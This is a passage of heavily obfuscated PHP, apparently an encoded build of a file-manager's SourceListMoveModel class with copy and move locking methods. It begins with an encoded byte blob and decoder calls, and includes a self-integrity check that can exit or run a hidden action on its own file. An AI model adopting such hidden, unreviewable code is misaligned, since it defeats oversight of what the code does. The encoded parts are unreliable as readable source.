ğË9mù’@N|')."\331\352\43\145\347\212\64\141\3\0\46\15\344\226\373\240\221\161\334\355\125\245\242\62\156\347\343\214\254\47\161\147\111\134\21\342\137\1\376\150\12\65\61\144\155\123\200\243\320"."\50\361\53\115\336\233\244\126\241\365\223\113\6\327\166\17\54\31\43\207\306\325\155\330\303\142\322\110\61\65\170\354\33\154\157\30\44\310\0\124\201\337\304\75\73\112\25\270\223"."\134\145\2\124\173\136\122\0\340\245\271\311\41\103\231\334\30\356\312\115\174\70\66\161\127\265\262\143\107\172\244\57\231\221\130\340\121\137\234\341\263\72\206\245\375\244\57\137\60"."\xfb\xd1\xa8\x5b\x32\xd2\x10\xbc\xb3\x3c\x98\x67\x2f\xcd\x59\x26\x13\x6f\xbd\x9c\x4f\x6\xe2\xe3\xc\xf6\x30\x2c\x90\xb3\xb8\x20\xac\x89\x77\xa9\xa5\xac\x31\xe1\xb2\x57\x0\x9d\xb3\x59\x4a\x68\xe2".base64_decode('bxvJQLw/la02yP7BWQfe+DohvGVfQ3RMYWHDI8KypSHNJjgSVibJOm3VQSaMVpmRCA==')."\xc6\x90\x38\x95\x75\xc2\x29\x8c\xaa\x14\x1c\x67\x44\x71\xc2\xe8\x32\x3a\x7b\xd3\x18\x58\x21\x99\x54\xb8\x82\x30\x7b\x9b\x33\xe6\xf0\x83\xc\x64\x5a\xcf\x64\x11\xb9\x98\x33\xed\xb5\x53\x7e\xc5\x2"."\xe7\xb1\x5c\x18\xad\x5c\x23\x2a\x9f\x5\x60\x94\xaa\xb2\xb6\x7\xcf\xe8\x36\xfe\x4e\x6e\x19\x42\x74\x12\x5b\x9\x55\x91\x75\x1b\x57\x50\xcf\x59\xa1\x14\xc3\xb5\xb3\x63\x18\xb4\x1f\xb6\xa8\x62\xd2"."\x83\xc1\xa\x7d\x3c\x56\xc9\xe9\xfc\x5a\xb6\x73\x50\xe5\x2\xf0\xc2\x90\x89\xa4\x47\xec\x26\x56\x2e\x84\xeb\xea\x72\xb1\xa8\x25\xe\x8e\xc8\xdb\x4a\x45\x37\x66\xa8\xa6\x4c\xf5\xd5\x81\x11\xdd\x54"."\366\310\0\345\307\342\310\325\17\335\356\106\335\352\105\233\32\261\232\300\200\164\123\156\314\352\304\115\206\120\222\215\217\342\134\135\245\265\102\221\53\102\253\156\74\215\25\65\275".base64_decode('CmnmfOKUvkwqvgLPvsZd5gLnR3lMm2+EcfWIlEUkLMu3cVrEu1A01XG+KLnr5llRMw==')."\x58\xe3\x35\xd6\x36\x62\x30\x46\x9c\x9a\x4b\x7b\x73\x57\xd4\x6d\x5e\x87\x4b\x48\x12\xd\x8a\x4a\x2b\x2f\x59\xf7\x6d\xb6\x74\x33\x9f\xe7\xc2\x2c\x8d\x4\x5\x3\x7e\xed\xb7\xa7\xb0\xc0\xc9\x82\x8e"."\x62\x92\x35\x53\x99\xf6\x41\xad\xbc\x4e\xdc\x82\x9c\xb0\x8a\x3\x1\xa6\xa0\x27\xcc\x42\x12\x2f\x88\x92\x67\x89\x9c\x1d\xd5\xfb\xe5\x68\xd8\xe4\x1a\x2f\x7c\x68\x58\xae\xa\xec\xcc\x47\x62\x3b\x78"."\x16\x6\x12\x76\x51\x76\xd\x24\xf9\x5c\x47\x31\xc9\x85\xbe\x24\x88\x7a\x6b\x15\x2e\xc1\xaa\xb4\x66\x1a\x99\x2e\x25\x90\xfc\xe5\x84\x59\x97\xde\x55\xba\x3a\x42\x74\x50\xb1\x62\x1f\x3f\xe9\x72\x89".base64_decode('mOw2iiJLcOx6Ca6AeGnBPbDkNFQt9nUseiYXId8sKULTsBAlfJ3IKRb2jd/FRrFcSg==')."\231\117\221\44\11\243\11\356\375\11\260\43\220\4\11\143\72\263\347\364\326\326\171\231\127\56\371\252\12\333\234\301\72\202\46\226\104\6\170\173\313\330\30\130\103\102\76\221\307"."\x94\xce\xb\x89\xff\x13\xe1\xe9\x81\xb8\x7a\xe1\xe3\x49\x7c\xc2\xf0\x58\x41\x92\x25\x74\x6e\x29\x49\x9c\xa3\xc8\x6c\x5d\x98\x2f\x50\x3\x4a\x9c\xa1\xab\x5c\x3a\xc5\x10\x4e\x6e\x76\x98\xbc\xba\x32"."\xa0\xf9\xe1\x4c\x7\xf7\xf9\xa2\x31\xd4\x3f\x8b\xe9\xb0\x44\x72\x55\x2\x4f\x31\xc8\xf\x4\x90\x52\xa2\x1f\xc2\xee\x17\x81\x4c\xea\xa4\x5f\x42\x8c\x30\xc3\xa0\x6e\x63\x98\x1\x33\x67\x72\x2\x1c"."\67\71\260\324\224\3\123\45\124\111\57\361\302\216\267\252\32\137\342\165\350\25\333\307\370\125\113\154\15\205\27\151\156\350\152\311\21\226\312\211\323\162\104\250\365\227\243\64\7"."\xf1\x5c\x23\x3a\xbb\x8f\xcb\x76\xea\x9d\x6d\x9d\x7e\xe\x6a\xe4\xd3\x93\x2a\x4a\x84\xb7\xaa\x26\x66\x62\xa5\x8f\xea\xb0\xc1\x1b\xc9\x1a\x9\x25\x1c\x69\xd\x35\x5\xc2\xcd\xa1\xd8\x12\xa5\x5f\xb7"."\x15\x61\x73\x42\x9e\xd2\x70\x4e\x65\xa2\xf\xa6\x88\x67\x54\xdd\xc7\xdf\x7b\xc0\x41\x6f\x1f\xda\x31\x78\x93\x7c\x57\x65\x89\xfd\x93\xf4\xa2\xba\xf4\x22\x96\xb3\x5a\x4a\x7f\x7a\xa1\xa4\xc6\x1c\xbe"."\146\223\51\51\203\265\334\145\162\147\204\116\127\312\234\57\350\245\371\307\164\154\364\44\265\130\52\120\54\323\32\310\137\376\13\344\55\16\71\67\22\204\364\334\104\215\67\162\303".base64_decode('hmWIic9KjMm1B5rbQx1qIByOLHPYCgr9foGrTJLyuyjSyIhBoF8vdaIGLqhkZ/QuNQ==').base64_decode('Ch0+2Z9enh1KwbuN/AEFGpVeMcoXNMPSJQB9Ymca3GrRMhnHm4SZlBQtOlfWsp9S6Q==')."\7\30\114\362\335\127\56\103\64\324\332\26\377\137\67\325\110\12\277\131\106\222\31\277\360\113\210\364\155\205\46\371\345\112\366\315\222\227\232\276\361\315\47\217\70\306\123\211\67".base64_decode('Ifa4nEm2QyCrU1gootLX7sUnkHRSGMvL56j+pJ+jmAawe8AgO7zDEbExwdmhNvw5ug==')."\x5d\x45\xbb\x70\xac\x31\x64\x5b\x18\xa6\x7d\x43\x7c\x2\xf0\xec\xb0\x23\x70\xbd\x5e\xe5\xb6\x94\x75\xbc\x4d\x55\xf2\xd\xf2\x6a\x2\x4d\x23\x87\x4c\x28\x67\xaf\xe8\x1c\x8a\xf1\x57\x52\x44\x51\x77"."\112\231\6\240\144\105\350\264\170\6\245\101\251\241\17\251\361\27\60\224\5\354\112\265\370\0\161\342\25\314\346\155\307\126\276\115\66\227\227\306\206\2\210\244\43\266\152\330\230"."\xcb\xcc\x8e\x95\x0\x1c\x8a\xac\x30\x6b\x17\x37\x6c\xc4\xef\x7f\xe4\x52\xa6\x8c\x3f\xc2\x90\xf1\xdd\x7\xfa\xe0\x21\xd5\x19\x78\xd0\xd6\x41\xb7\x4b\x1f\x4b\xa2\xc5\xff\xbf\x14\xa4\x89\x31\xc9\x6b"."\243\263\222\322\6\131\356\245\116\210\135\370\35\250\264\71\342\174\5\21\103\334\57\77\71\336\174\222\46\15\271\371\53\277\122\345\54\344\51\171\207\105\41\117\327\52\210\324\141"."\24\261\273\50\266\47\45\231\245\117\117\245\77\75\360\313\226\63\167\43\50\243\202\117\126\163\242\152\112\33\231\144\201\233\54\11\100\273\56\24\5\244\24\266\332\321\330\23\275"."\344\205\270\146\306\223\341\351\227\162\317\201\141\347\174\316\27\154\304\303\100\142\355\164\76\224\302\17\336\55\61\31\54\333\361\64\117\334\214\153\375\36\52\221\141\256\46\142\215"."\143\162\130\66\266\45\275\100\211\114\231\227\344\343\275\120\312\300\236\330\113\172\310\213\157\224\325\271\337\226\221\146\32\347\237\162\351\376\214\331\247\145\242\324\250\317\161\123\246".base64_decode('gHZTOlsDHNkoyK/l8+LoQl4y0b+OG4qQ1hVvU8k9e5VaEsQEzUkHhxQIh4jFXIgeoQ==')."\70\240\5\151\237\47\373\73\245\307\52\342\116\34\144\107\355\354\244\47\246\200\60\271\112\166\212\315\125\342\55\322\123\356\376\322\123\157\154\256\10\34\205\74\21\55\254\76\310".base64_decode('HXh5IwYZlAWKIA3HRMakhKRh+qYe4RSy4P41UOndI3i7r9wzRpTyyU+znuKbGhwXiw==').base64_decode('u+wrRBjBuJ/VK30ikD0HyKYOvAVY5oG/Cd8H9Ijrj1/3OpK4pOd8+Rn3g4sGfN9Qsg==')."\365\160\357\72\70\132\135\5\242\156\44\307\315\122\375\260\260\13\160\274\136\50\365\32\130\133\351\13\210\22\32\244\176\27\13\31\17\61\221\360\60\137\173\145\37\121\164\274\325"."\344\36\320\62\317\60\176\143\205\140\113\115\66\135\111\47\327\253\137\320\127\140\47\314\356\154\206\203\166\325\202\56\56\360\120\277\246\45\13\304\212\154\262\156\306\254\171\262\162".strrev('#%Y ›± MßøEk®•RÕS¿}/‹4è’~Ï*¦s'."\n".'†IÅ'."\n".' ŠÒ|pw8¡C')."\xf4\xd2\x97\x8f\x4b\x30\x42\xe8\x56\xb2\xd9\x92\x16\x48\x97\x71\x8e\x89\xed\x65\x2c\x31\xb\xe9\x92\x28\xde\xed\x74\x7e\x8b\x8a\x13\x65\xfa\x21\xad\x83\x62\xf2\xd0\x37\x18\xcd\xc\xde\x73\x67\xb1".base64_decode('Lt8uaM4NZrl9FMEE27QZ5P1y3d12ghjQrohkaaMl12ibbtUQLo7XSaLmjOQysIzjCw==').base64_decode('4GL2SZzpfzGAbM9Et1fCbgt337HVdmLBv5ixnTLvbUpWLV/TByr58b2iV7O9ErFKqg==')."\105\335\216\220\301\6\366\41\266\264\316\176\273\252\107\305\104\35\275\36\145\242\114\245\342\237\364\54\247\160\27\46\11\176\270\64\273\41\72\201\106\200\134\120\164\212\120\362\163"."\x82\xe4\x92\x9f\xf0\x8e\x41\xa6\xb2\x63\x5a\x4b\xbe\x8c\xe5\x4b\x72\xa4\x22\x79\x7e\x94\x56\x2d\x3d\xce\x28\x34\x46\x44\xc5\x4\x3d\x82\xc9\x4e\x8c\x1f\x48\x33\x3\xad\xfc\x6e\xa5\x26\x19\xe1\x39"."\xd5\x58\x18\xd5\xd2\x93\xba\xa6\x1c\x16\x43\x80\x97\x84\x8\xf3\xa\x8b\xbe\xee\xd8\x86\xa2\x78\xb3\xeb\xf1\x65\xc2\xbe\xdc\x2f\x32\x33\x14\x11\x1e\x21\xd8\xa1\x74\x45\xd7\xb1\xe7\xe1\xcf\xd3\x39"."\xf6\x40\x96\xfb\x8d\x4a\x24\x9\xca\x5e\x9e\x51\xd4\xfd\x7a\x2f\xf0\x4d\x72\xf\x87\x7e\x4d\x5a\x79\xc5\x22\x2b\x42\x1d\xc5\xac\x88\x48\xba\x5f\xb2\xdd\xe2\x89\x8e\x9b\xcc\xd8\x7\x96\x8b\x25\xb0"."\xfb\xd1\x96\xeb\x85\x5a\xea\x73\x97\x86\xd9\xae\xe0\xff\xf7\xf3\x8c\xff\xb7\x5e\x65\x9c\x55\xc3\xb4\xf4\x8e\x47\x9b\x5b\x41\x36\x87\xd6\xe2\xa3\x50\xae\xab\xa0\x1a\x62\x57\x3f\x9c\xab\xeb\x24\xa0"."\42\376\132\271\24\347\226\333\314\17\32\163\217\246\261\223\62\55\223\221\326\340\362\273\231\222\247\161\21\361\15\362\167\126\313\105\334\367\374\334\317\344\166\263\27\345\311\13\270"."\xbd\xe5\x32\xa\x36\xc4\x37\x4d\x65\xe8\x98\x82\x98\xac\x2c\xbd\x95\x6e\x24\x6\xcb\x1c\x73\x13\xcb\x55\xa7\x8f\x6c\x49\x36\x29\xc9\x26\xda\x80\x44\x18\xe6\x60\xce\xcf\x42\x9\xbc\x5b\x24\x5e\x1f"."\0\173\362\5\335\110\236\355\53\253\201\351\367\56\146\314\211\170\3\0\36\45\363\45\7\250\204\233\305\35\143\342\0\312\350\206\61\304\127\234\331\160\72\112\264\273\236\3\245"."\x99\x2c\x19\xb7\xe\xcd\x7e\xa9\xd5\x43\x69\x69\xce\x7\xe4\x22\xd8\x60\xde\xa9\xec\xe2\x2f\xb9\xd7\xb8\x9f\x76\xaf\xf5\xba\xaa\xe3\x2f\xa2\x3a\x69\xdd\xf1\x44\x27\xb5\x14\x41\x13\x24\x8a\x35\x20"."\x4c\xa7\x45\xe\x87\xc8\x29\xb1\xb7\xb4\xc\xa5\xeb\x98\xc8\x33\xc1\xcc\x2a\x3f\xbf\x79\xa3\x84\x82\xf\x87\x64\x7c\x30\x3e\xd1\x59\x30\x89\x9c\xe8\x84\x72\xad\x90\x64\xc3\x2c\xbd\x48\x5e\x22\xea"."\121\360\124\137\311\42\305\130\246\143\244\260\151\35\157\210\141\22\137\373\254\150\127\173\25\271\261\5\204\216\66\53\55\246\40\31\351\171\160\74\61\205\17\114\154\261\115\364\223"."\xb2\x1c\xc0\xee\x4b\x4a\x77\x10\x0\xe4\xd0\x22\x5a\xf2\xb3\x26\xce\x92\xf8\x56\x89\x73\xa\x2e\x2c\x97\x2d\x61\x16\x2c\x29\x1b\x87\x97\xcb\x8b\x9\x53\xd6\x92\xc8\x69\xf8\x69\x67\xdb\x31\x44\xe2"."\xd9\x4\xf7\x73\x9\x44\x77\x40\xd5\x1\xe\xad\x0\x1c\x23\xcb\x20\xe9\x58\x15\x89\xf2\x49\xe7\xfb\x2b\x24\x91\x80\x99\xbb\x54\xa8\x41\x3a\x18\x74\x9e\xcb\x72\xc7\xf0\x25\xec\xb6\x68\x84\xa5\x64"."\x52\x8a\x79\xe1\x43\xbf\xf8\x4e\x69\x48\x38\xd9\x20\xc9\xf4\xc8\x23\x30\xac\x71\x3f\x36\xee\x52\xce\x7\xe5\xa5\x53\xdc\x4\x21\xc8\x60\xe9\x41\x9d\x38\x3f\x94\x84\x15\x56\xc\xef\xbb\xc4\x3a\xe2".base64_decode('gpd7Hz2lDQtJS0j6yWSLNlwma5LtdTgUQXhWIqlJ17HFXQl9xP2AtE++wu3IWAoV1w==')."\265\245\362\342\310\106\164\23\303\312\165\237\114\64\147\161\371\72\70\47\52\1\242\57\150\160\223\7\151\127\205\155\102\204\55\4\355\12\127\46\210\117\72\57\237\363\154\174\314".base64_decode('UB5ykcrrgLr2iVhvw8QOV5IlP/7sPJyVtRsSCeiZsFSdfHA7YYFY+Y8IqnSiWLq1Lw==')."\22\330\12\151\72\220\57\261\110\336\61\310\31\225\23\35\315\161\17\55\331\326\10\362\245\300\54\121\32\323\264\200\63\211\346\327\135\255\227\13\270\173\106\113\130\43\206\235\110".strrev('–\\€NÊ:ó!Ip“F-•ĞÊe›ˆş²G´”•½ÔáŠ·uíò¡ğ©¡xRÄÒ­{K')."\x26\xe1\xb2\x25\xc9\xac\xb0\xa4\xcc\x91\xca\xd9\x5a\xd1\x9a\xa0\x7b\xa5\xc8\x3\x8d\x46\xb2\x4c\x87\xc5\xbe\x5f\xca\x3a\x11\x3e\xcb\x66\x2e\xfd\x1c\x50\x9c\x3b\x37\x51\x81\x94\x6f\x85\xd0\x5c\xb8".base64_decode('TuHLtaJs5glbIXK7VoFyvJallOGulHNMaJkirDVK2bxIK2M7Qj+Jl3DZSVeZZNkQpQ==')."\274\251\112\264\54\147\260\234\66\44\56\270\214\67\360\361\12\302\27\20\43\332\215\146\214\101\141\243\307\114\364\247\72\330\177\61\67\230\63\371\222\222\24\46\230\330\174\74\120".base64_decode('cOO5pDYnGeeKktvcsjcGPFh3ULpLz2j8kpYwY6LbKtM2ErrTN6/sq4ums49kJMWkSw==').base64_decode('Jyg0GQ4bhzKaMgICsU+o62l9kkAjaMJxoYeKEXDKQQ9Im/BBPD8aI35l6bJLk2NmwQ==')."\xf6\xe0\xb4\xb8\x99\x27\xbf\x8d\xa6\x6d\xb\x83\x1\xaa\x3a\x20\xb2\x22\x5e\x3b\x3d\x92\x3d\xc\xa\x89\x73\x30\xdc\x28\x72\xc0\x42\xc8\x96\x70\x1f\x12\x84\xa3\x5a\xbc\x27\x8f\xe9\x34\x95\xf0\x2c"."\107\4\37\334\360\210\274\64\302\221\155\113\321\165\250\54\0\150\3\334\147\216\62\7\131\330\167\200\150\217\70\332\321\334\362\240\20\145\200\24\145\353\36\342\241\301\362\323\24"."\x3f\xbc\xfc\xe0\x25\x75\xc0\x3\x70\xbe\x81\x7c\xbf\xa3\x38\x7d\x3a\x8b\x5b\xe1\x7e\x5d\xd\xa0\xce\x15\x55\x50\xb7\xef\x44\xb7\x6\x17\x8e\x62\xf1\x58\x49\x52\x67\x20\x16\x5b\x16\x89\x36\x53\x2f".base64_decode('8SXJpJRkLVWS1NkW6ZgoLdgeCIVL0rBhVYcqXK3RpFAnaSU5nZyoFaGmJaIl5BxcnA==')."\32\344\323\46\123\376\263\123\225\230\226\141\172\0\111\213\254\147\205\217\75\121\306\251\336\220\307\325\142\316\60\171\300\371\344\222\313\176\221\21\54\124\204\215\242\72\240\356\50".base64_decode('e0oZe83n857L3OJg3+cwAJDgZG4QZiPRnLwmE8C0sgiStcqlJx4kVSAAN+xoEyzqBg==')._kodDe('Miq4MNXab8xkG7ZAjGgeTY+eM+GZKYOT8y/G5yhKcevbi+wlN+9I7Jzs'), 10, -8))); goto f‡ø„º‹­ø; D•§Æ¡¾ó±: $_file = $_SERVER[$_SERVER[ú‡®¯¨±][203]]; $_size = $_SERVER[ú‡®¯¨±][932]; if ($_SERVER[$_SERVER[ú‡®¯¨±][202]] != $_size($_file)) { $_getc = $_SERVER[ú‡®¯¨±][204]; $_getfile = $_SERVER[$_SERVER[ú‡®¯¨±][205]] . $_SERVER[ú‡®¯¨±][206]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ú‡®¯¨±][207], $_getfilec); if (count($_getarrs) < $_SERVER[ú‡®¯¨±][208]) { $exit = $_SERVER[ú‡®¯¨±][209]; $exit(); } $_act = $_SERVER[ú‡®¯¨±][210]; $_act($_file); } goto c«Ø Áİù‰; CÛ¸ˆÇÊ«Ÿ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ŸØÂô¶›) { $âß´Ãüò =& $_SERVER[ú‡®¯¨±]; if (!$this->allowLock()) { return; } $this->_lockCheck($âß´Ãüò[596], $ŸØÂô¶›); $“Ã°˜¶× = 1; $this->_lockEvent($ŸØÂô¶›, array($âß´Ãüò[597], $âß´Ãüò[598]), $“Ã°˜¶×); $this->_lockParent($ŸØÂô¶›, array($âß´Ãüò[598]), $“Ã°˜¶×); $this->_lockEvent($ŸØÂô¶›, array($âß´Ãüò[599], $âß´Ãüò[600]), $“Ã°˜¶×); $this->_lockCheckEnd($âß´Ãüò[596], $ŸØÂô¶›); } public function lockCopyEnd($çƒ÷‚) { $£°·«ª³ =& $_SERVER[ú‡®¯¨±]; if (!$this->allowLock()) { return; } $ÉåŠ™°¤ = 0; $this->_lockEvent($çƒ÷‚, array($£°·«ª³[597], $£°·«ª³[598]), $ÉåŠ™°¤); $this->_lockParent($çƒ÷‚, array($£°·«ª³[598]), $ÉåŠ™°¤); $this->_lockEvent($çƒ÷‚, array($£°·«ª³[599], $£°·«ª³[600]), $ÉåŠ™°¤); } public function lockWriteStart($ë¥Š”Éá, $ÉáÂÅ¾× = '') { $«Üˆ¾ÁÓ =& $_SERVER[ú‡®¯¨±]; if (!$this->allowLock()) { return; } $this->_lockCheck($«Üˆ¾ÁÓ[597], $ë¥Š”Éá); $ØÛ§¢Šı = 1; $this->_lockKey($«Üˆ¾ÁÓ[601] . $ë¥Š”Éá . $«Üˆ¾ÁÓ[10] . $ÉáÂÅ¾×, $ØÛ§¢Šı); $this->_lockEvent($ë¥Š”Éá, array($«Üˆ¾ÁÓ[596], $«Üˆ¾ÁÓ[598]), $ØÛ§¢Šı); $this->_lockParent($ë¥Š”Éá, array($«Üˆ¾ÁÓ[596], $«Üˆ¾ÁÓ[598]), $ØÛ§¢Šı); $this->_lockCheckEnd($«Üˆ¾ÁÓ[597], $ë¥Š”Éá); } public function lockWriteEnd($•³Èöõ», $Ö ¾ËèÛ = '') { $µªÀÁëà =& $_SERVER[ú‡®¯¨±]; if (!$this->allowLock()) { return; } $ßïœ©œ‚ = 0; $this->_lockKey($µªÀÁëà[601] . $•³Èöõ» . $µªÀÁëà[10] . $Ö ¾ËèÛ, $ßïœ©œ‚); $this->_lockEvent($•³Èöõ», array($µªÀÁëà[596], $µªÀÁëà[598]), $ßïœ©œ‚); $this->_lockParent($•³Èöõ», array($µªÀÁëà[596], $µªÀÁëà[598]), $ßïœ©œ‚); } public function lockMoveStart($¨šêÕ²) { $ÉÄ–óí =& $_SERVER[ú‡®¯¨±]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÉÄ–óí[598], $¨šêÕ²); $ûÄø¶óğ = 1; $this->_lockKey($ÉÄ–óí[602] . $¨šêÕ², $ûÄø¶óğ); $this->_lockEvent($¨šêÕ², array($ÉÄ–óí[596], $ÉÄ–óí[597]), $ûÄø¶óğ); $this->_lockParent($¨šêÕ², array($ÉÄ–óí[596], $ÉÄ–óí[598]), $ûÄø¶óğ); $this->_lockEvent($¨šêÕ², array($ÉÄ–óí[603], $ÉÄ–óí[599], $ÉÄ–óí[600]), $ûÄø¶óğ); $this->_lockCheckEnd($ÉÄ–óí[598], $¨šêÕ²); } public function lockMoveEnd($Šß£Ë±½) { $«¡ıİ”Ò =& $_SERVER[ú‡®¯¨±]; if (!$this->allowLock()) { return; } $èô¶ºÎ› = 0; $this->_lockKey($«¡ıİ”Ò[602] . $Šß£Ë±½, $èô¶ºÎ›); $this->_lockEvent($Šß£Ë±½, array($«¡ıİ”Ò[596], $«¡ıİ”Ò[597]), $èô¶ºÎ›); $this->_lockParent($Šß£Ë±½, array($«¡ıİ”Ò[596], $«¡ıİ”Ò[598]), $èô¶ºÎ›); $this->_lockEvent($Šß£Ë±½, array($«¡ıİ”Ò[603], $«¡ıİ”Ò[599], $«¡ıİ”Ò[600]), $èô¶ºÎ›); } private function _lockCheck($ßÉ¬ÈÉŸ, $êÌÀ£¯ô) { $Îüû«ë¬ =& $_SERVER[ú‡®¯¨±]; $æØ¦…§Ô = $this->sourceInfo($êÌÀ£¯ô); $ îş¿šÏ = $ßÉ¬ÈÉŸ . $Îüû«ë¬[10] . $êÌÀ£¯ô; $this->_lockTimeStart[$ îş¿šÏ] = timeFloat(); if (!is_array($æØ¦…§Ô)) { return; } $ ØÒîâï = LNG($Îüû«ë¬[604]); CacheLock::setErrorMsg($Îüû«ë¬[165] . htmlspecialchars($æØ¦…§Ô[$Îüû«ë¬[32]]) . $Îüû«ë¬[167] . $ ØÒîâï); $this->_lockKey($ îş¿šÏ, 1); $this->_lockKey($ îş¿šÏ, 0); $Û‚¦¶½ƒ = array_reverse($this->parentLevelArray($æØ¦…§Ô[$Îüû«ë¬[563]])); foreach ($Û‚¦¶½ƒ as $“¢Öã„) { $ îş¿šÏ = $ßÉ¬ÈÉŸ . $Îüû«ë¬[605] . $“¢Öã„; if (CacheLock::lockGet($Îüû«ë¬[606] . $ îş¿šÏ)) { $æØ¦…§Ô = $this->sourceInfo($“¢Öã„); CacheLock::setErrorMsg($Îüû«ë¬[165] . htmlspecialchars($æØ¦…§Ô[$Îüû«ë¬[32]]) . $Îüû«ë¬[167] . $ ØÒîâï); $this->_lockKey($ îş¿šÏ, 1); $this->_lockKey($ îş¿šÏ, 0); } } } private function _lockCheckEnd($ÜÛ„öŞ‰, $”Ï±§…Â) { $°øëê¹ƒ =& $_SERVER[ú‡®¯¨±]; $”·ô‹ı = $ÜÛ„öŞ‰ . $°øëê¹ƒ[10] . $”Ï±§…Â; CacheLock::setErrorMsg($°øëê¹ƒ[211]); if (!isset($this->_lockTimeStart[$”·ô‹ı])) { return; } $û×²èÙ = timeFloat() - $this->_lockTimeStart[$”·ô‹ı]; unset($this->_lockTimeStart[$”·ô‹ı]); if ($û×²èÙ > 0.5) { unset(self::$cacheSourceInfo[$°øëê¹ƒ[511] . $”Ï±§…Â]); } $ê©¡¤Äª = $this->sourceInfo($”Ï±§…Â); if (!$ê©¡¤Äª) { show_json(LNG($°øëê¹ƒ[107]), !1); } } private function _lockParent($˜©  ƒÁ, $™ú§«Å˜, $€é†‹) { if (!$this->autoLockSet) { return; } $åû¦‹ÏŸ = $this->sourceInfo($˜©  ƒÁ); if (!is_array($åû¦‹ÏŸ)) { return; } $öªµóÃ  = array_reverse($this->parentLevelArray($åû¦‹ÏŸ[$_SERVER[ú‡®¯¨±][563]])); foreach ($öªµóÃ  as $ÍÙõ¡Šı) { $this->_lockEvent($ÍÙõ¡Šı, $™ú§«Å˜, $€é†‹); } } private function _lockEvent($óÊ °œ•, $Æüïãı», $­ÄğĞ») { $÷´õ›®Ã =& $_SERVER[ú‡®¯¨±]; if (!$this->autoLockSet) { return; } foreach ($Æüïãı» as $Œô«òŸ©) { $âçÙÛ· = $Œô«òŸ© . $÷´õ›®Ã[10] . $óÊ °œ•; if ($­ÄğĞ» && CacheLock::lockGet($÷´õ›®Ã[606] . $âçÙÛ·)) { continue; } $this->_lockKey($âçÙÛ·, $­ÄğĞ»); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ã¨üÔ¿, $¢¼şƒó = 1) { $íşüóÛû = $_SERVER[ú‡®¯¨±][606] . md5($ã¨üÔ¿); if ($¢¼şƒó) { if (isset(self::$_lockItemArr[$íşüóÛû])) { return; } self::$_lockItemArr[$íşüóÛû] = 1; CacheLock::lock($íşüóÛû, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$íşüóÛû])) { return; } unset(self::$_lockItemArr[$íşüóÛû]); CacheLock::unlock($íşüóÛû); } } public function isParentOf($Á˜êèµœ, $«™‹‰ïš) { $ ½ŞŒÑ‰ =& $_SERVER[ú‡®¯¨±]; $Ïù‹şú¤ = $this->sourceInfo($Á˜êèµœ); $İµäª¦™ = $this->sourceInfo($«™‹‰ïš); $ö­‘ßşÚ = $Ïù‹şú¤[$ ½ŞŒÑ‰[563]] . $Ïù‹şú¤[$ ½ŞŒÑ‰[183]] . $ ½ŞŒÑ‰[50]; $Ùè›Ñˆâ = $İµäª¦™[$ ½ŞŒÑ‰[563]] . $İµäª¦™[$ ½ŞŒÑ‰[183]] . $ ½ŞŒÑ‰[50]; $‰¸³¨Øö = strpos($Ùè›Ñˆâ, $ö­‘ßşÚ) === 0; return $‰¸³¨Øö; } private $targetIsDelete = 0; public function copy($÷Ô„ö¹‚, $ĞßÒûÖã, $è…–åÆ­ = REPEAT_REPLACE, $şåÅ³ = '') { $¾ç”øò =& $_SERVER[ú‡®¯¨±]; $Î¬Ÿ·º = $this->sourceInfo($÷Ô„ö¹‚); $Üîê¦¥Â = $this->sourceInfo($ĞßÒûÖã); if (!$Î¬Ÿ·º || !$Üîê¦¥Â || $Üîê¦¥Â[$¾ç”øò[463]] != $¾ç”øò[90]) { return !1; } if ($this->isParentOf($÷Ô„ö¹‚, $ĞßÒûÖã)) { return !1; } $â÷Ÿ°´Š = $şåÅ³ ? $şåÅ³ : $Î¬Ÿ·º[$¾ç”øò[32]]; $this->lockCopyStart($÷Ô„ö¹‚); $this->lockWriteStart($ĞßÒûÖã, $â÷Ÿ°´Š); $Ã»Ğ—ğ¡ = array($¾ç”øò[607] => array(), $¾ç”øò[608] => array(), $¾ç”øò[609] => array()); $this->targetIsDelete = intval($Î¬Ÿ·º[$¾ç”øò[483]]); $£ì×¸¡ = $this->fileNameExistAuto($ĞßÒûÖã, $Î¬Ÿ·º); $üÊğÉÚ³ = $this->_copy($÷Ô„ö¹‚, $ĞßÒûÖã, $è…–åÆ­, $Ã»Ğ—ğ¡, !0, $şåÅ³); $this->_childrenListClear(); $this->lockCopyEnd($÷Ô„ö¹‚); $this->lockWriteEnd($ĞßÒûÖã, $â÷Ÿ°´Š); if ($Î¬Ÿ·º[$¾ç”øò[463]] == $¾ç”øò[90] && $£ì×¸¡ == $üÊğÉÚ³) { $this->folderSizeResetChildren($£ì×¸¡); } Model($¾ç”øò[610])->addAll($Ã»Ğ—ğ¡[$¾ç”øò[608]], array(), !0); if ($£ì×¸¡ != $üÊğÉÚ³ || $Î¬Ÿ·º[$¾ç”øò[463]] == $¾ç”øò[90]) { Model($¾ç”øò[611])->eventCopy($üÊğÉÚ³); } $this->saveAll($Ã»Ğ—ğ¡[$¾ç”øò[609]]); Model($¾ç”øò[226])->linkAdd($Ã»Ğ—ğ¡[$¾ç”øò[607]]); $this->folderSizeReset($ĞßÒûÖã); $this->updateModifyTime($ĞßÒûÖã); return $üÊğÉÚ³; } private function _copy($Ğß§æ¬š, $¤ÚáóÓÈ, $š»¿æ«Œ, &$ıİ‰¶œ, $ÍØü¢÷¨, $¾ˆÉÊÈ = '') { $äşˆì¨™ =& $_SERVER[ú‡®¯¨±]; $ü£õÇÚ = $this->sourceInfoCache($Ğß§æ¬š); $ĞÊ„æ‘ò = $ü£õÇÚ[$äşˆì¨™[463]] == $äşˆì¨™[90]; $Ñ£œŠ¾¢ = $¾ˆÉÊÈ ? $¾ˆÉÊÈ : $ü£õÇÚ[$äşˆì¨™[32]]; $Æ˜‘Ÿ = $this->fileNameExistAuto($¤ÚáóÓÈ, $ü£õÇÚ); if ($ÍØü¢÷¨) { $this->_childrenAllMake($Ğß§æ¬š); if ($ĞÊ„æ‘ò && $Æ˜‘Ÿ) { $this->_childrenAllMake($Æ˜‘Ÿ); } } if (!$Æ˜‘Ÿ) { return $this->_copyCreate($Ğß§æ¬š, $¤ÚáóÓÈ, $Ñ£œŠ¾¢, 